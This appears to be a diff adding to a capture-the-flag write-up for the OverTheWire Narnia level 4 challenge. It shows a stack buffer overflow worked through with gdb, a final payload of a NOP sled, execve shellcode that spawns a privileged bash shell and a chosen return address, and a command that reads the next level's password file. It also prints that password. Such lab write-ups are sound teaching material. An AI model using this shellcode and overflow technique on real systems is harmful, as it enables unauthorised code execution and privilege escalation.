@@ -28,8 +28,29 @@ We see the following:
 This confirms that the offset is 264 bytes.  
 Now we can construct our payload. 
 We know we want a NOP sled and a shell so we will use basically the same payload as level 2, but with a few changes.  
-One of those changes is the memory address we want to jump to so we must send a bunch of A's (\x41) to the program and see where our input is landing.
-To do this we 
+One of those changes is the memory address we want to jump to so we must send a bunch of A's (\x41) to the program and see where our input is landing.  
+To do this we can use gdb just like in level 2 using the following commands:  
+$ gdb ./narnia4  
+(gdb) break main  
+(gdb) r $(perl -e 'print "\x41"x264 . "\x42\x42\x42\x42";')  
+(gdb) c  
+(gdb) x/200x $esp  
+In which we then see the following:  
+<img width="626" alt="Screen Shot 2024-01-16 at 8 00 23 PM" src="https://github.com/tylerdionne/OverTheWire-Narnia-Write-ups/assets/143131384/918a7128-a5c3-482a-914e-262cac78b255">
+
+We then pick an address close to where our input is landing. 
+I will choose 0xffffd710 for this challenge because it is close to the beginning of where our input is landing.  
+We will use the same shellcode as in level 2 because we still want a shell.  
+Our final payload will be:  
+./narnia4 $(perl -e 'print "\x90"x(264-33) . "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80" . "\x10\xd7\xff\xff";')  
+Running this command along with:  
+$ cat /etc/narnia_pass/narnia5  
+We get the password:  
+<img width="628" alt="Screen Shot 2024-01-16 at 8 03 22 PM" src="https://github.com/tylerdionne/OverTheWire-Narnia-Write-ups/assets/143131384/815c902e-d95c-4779-aca4-51d2eb7eaca4">
+
+Pass: 1oCoEkRJSB
+
+
 
 
 
